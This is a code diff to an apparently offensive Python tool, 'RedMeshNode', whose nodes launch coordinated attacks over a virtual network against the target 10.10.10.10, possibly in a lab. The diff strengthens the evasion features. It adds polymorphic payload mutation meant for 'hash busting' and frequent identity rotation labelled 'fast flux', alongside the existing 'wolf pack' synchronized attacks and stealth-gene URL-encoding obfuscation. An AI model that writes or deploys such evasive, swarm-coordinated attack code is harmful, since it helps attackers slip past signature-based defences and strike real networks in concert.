@@ -21,6 +21,7 @@ import zlib
 from vnet.nic import VNic
 from vnet.protocol import MSG_DATA
 from payloads.obfuscation import deep_encode
+from payloads.polymorph import polymorph_payload
 
 # Configuration
 MCAST_GRP = '224.1.1.1'
@@ -137,17 +138,17 @@ class RedMeshNode:
 
     def net_exploit(self):
         """Launch attacks via VNet."""
+        # Fast Flux: Rotate Identity frequently
+        if self.block_count > 0 or random.random() < 0.2:
+            self.hyper_mutate()
+
         if not self.nic.connected:
-            if self.block_count > 2:
-                self.hyper_mutate()
-            else:
-                self.nic.connect()
+            self.nic.connect()
             return
 
         target = "10.10.10.10" # Static for now, or use discovered targets
 
-        # Wolf Pack Coordination:
-        # If we have many peers, maybe we trigger a synchronized attack
+        # Wolf Pack Coordination
         if len(self.peers) > 2 and random.random() < 0.1:
             logger.info("🐺 WOLF PACK: Initiating Synchronized Attack")
             self.broadcast("CMD", "SYNC_ATTACK")
@@ -168,7 +169,10 @@ class RedMeshNode:
             "data": attack['data']
         }
 
-        # Obfuscation (Evolutionary)
+        # 1. Structural Polymorphism (Hash Busting)
+        payload = polymorph_payload(payload)
+
+        # 2. Obfuscation (Evolutionary)
         if random.random() < self.genes['stealth']:
             # URL Encode values
             for k, v in payload['data'].items():
@@ -181,7 +185,7 @@ class RedMeshNode:
             logger.warning("💥 Attack Blocked/Failed")
             self.block_count += 1
         else:
-            self.block_count = max(0, self.block_count - 1)
+            self.block_count = 0 # Reset on success
 
     def broadcast(self, msg_type, payload):
         """Send message to mesh (Encrypted)."""
